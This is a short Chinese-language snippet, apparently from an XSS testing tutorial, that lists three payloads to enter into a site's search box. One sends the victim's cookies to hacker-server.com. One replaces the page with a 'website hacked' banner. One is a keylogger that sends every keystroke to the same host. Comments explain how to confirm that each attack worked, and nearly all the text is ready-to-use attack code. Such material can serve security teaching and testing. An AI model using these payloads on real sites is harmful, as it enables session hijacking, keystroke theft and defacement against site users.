# 搞崩 1：偷 Cookie（最经典的 XSS 攻击）
# 在搜索框输入：
<script>document.location='http://hacker-server.com/steal?cookie='+document.cookie</script>
# 如果弹窗没出现，但你的浏览器发出了一个请求到 hacker-server.com
# 说明 XSS 可以执行，Cookie 已经被发出去了

# 搞崩 2：改页面内容
# 在搜索框输入：
<body onload="document.body.innerHTML='<h1>网站被黑了</h1>'">
# 如果页面内容被替换成"网站被黑了"，说明 XSS 能篡改页面

# 搞崩 3：键盘记录器
# 在搜索框输入：
<script>
document.onkeypress = function(e) {
    new Image().src = 'http://hacker-server.com/keylog?key=' + e.key;
};
</script>
# 如果页面正常加载但每次按键都发出请求，说明 XSS 可以做键盘记录
